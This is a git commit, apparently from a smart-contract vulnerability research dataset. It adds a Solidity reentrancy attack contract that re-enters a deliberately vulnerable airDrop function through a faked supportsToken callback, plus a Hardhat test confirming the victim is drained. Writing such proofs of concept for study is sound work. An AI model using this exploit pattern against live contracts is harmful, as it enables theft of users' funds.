64ecd5ea2b6e0f950ed1f349ab8c1c7b2662fef7
sofiabobadilla <sofy.bobadilla@gmail.com>
2024-08-14 19:19:21 +0200

    add: attack for modifier_reentrancy

---
+++ smartbugs-curated/0.4.x/contracts/reentrancy/modifier_reentrancy_attack.sol
@@ -0,0 +1,35 @@
+pragma solidity ^0.4.10;
+
+import "../dataset/reentrancy/modifier_reentrancy.sol";
+
+contract MaliciousContract{
+    ModifierEntrancy modifierentrancy;
+    bool public hasBeenCalled;
+    
+
+    constructor(address _victimAddress) public{
+        modifierentrancy= ModifierEntrancy (_victimAddress);
+    }
+
+   function initiateAttack() public {
+    // the attack consist on making the contract give as much ether as possible
+    //by pretending the contract has 0 balance and faking the modifier supportsToken
+        modifierentrancy.airDrop();
+    }
+
+    // This function will be called during the supportsToken modifier
+    function supportsToken() external returns (bytes32) {
+        if (!hasBeenCalled) {
+            hasBeenCalled = true;
+            modifierentrancy.airDrop();
+        }
+        return (keccak256(abi.encodePacked("Nu Token")));
+    }
+
+
+    // Helper function to check the token balance
+    function getTokenBalance() public view returns (uint) {
+        return modifierentrancy.tokenBalance(address(this));
+    }
+
+}
---
+++ smartbugs-curated/0.4.x/test/reentrancy/modifier_reentrancy.js
@@ -0,0 +1,58 @@
+const { expect } = require("chai");
+const { ethers } = require("hardhat");
+describe("Reentrancy Attack for modifier_reentrancy.sol", function () {  
+    let PrivateBank;
+    let victim;
+    let MaliciousContract;
+    let hacker;
+    let Log;
+    let log;
+
+    beforeEach(async function () {
+        // Deploy Log contract
+
+        // Deploy PrivateBank contract with Log address
+        PrivateBank = await ethers.getContractFactory("contracts/dataset/reentrancy/modifier_reentrancy.sol:ModifierEntrancy");
+        victim = await PrivateBank.deploy();
+        await victim.waitForDeployment();
+        //await victim.setLog(log.target); // Set Log address after deployment
+
+        // Deploy MaliciousContract with PrivateBank address
+        MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/modifier_reentrancy_attack.sol:MaliciousContract");
+        hacker = await MaliciousContract.deploy(victim.target);
+        
+    });
+
+    it("should successfully drain funds through reentrancy attack", async function () {
+
+
+        // Set hacker balance to 0
+        await network.provider.send("hardhat_setBalance", [
+            hacker.target,
+            "0x0",
+          ]);
+        let hackerBalance = await ethers.provider.getBalance(hacker.target);
+        expect(hackerBalance).to.equal(0);
+
+        let hackerBalanceOnVictim= await victim.tokenBalance(hacker.target);
+        expect(hackerBalanceOnVictim).to.equal("0");
+
+        // Perform reentrancy attack through MaliciousContract
+        await hacker.initiateAttack();
+        
+        // Check balances after attack on the victim contract
+        const victimBalance = await victim.tokenBalance(victim.target);
+        hackerBalanceOnVictim= await victim.tokenBalance(hacker.target);
+    
+
+        // Verify the attack was successful
+        
+        // victim has a drained account
+        expect(victimBalance).to.equal("0"); 
+
+        // 20 from first call + 2 from  reentrant call
+        expect(hackerBalanceOnVictim).to.equal("40");
+        
+    });
+    });
+  
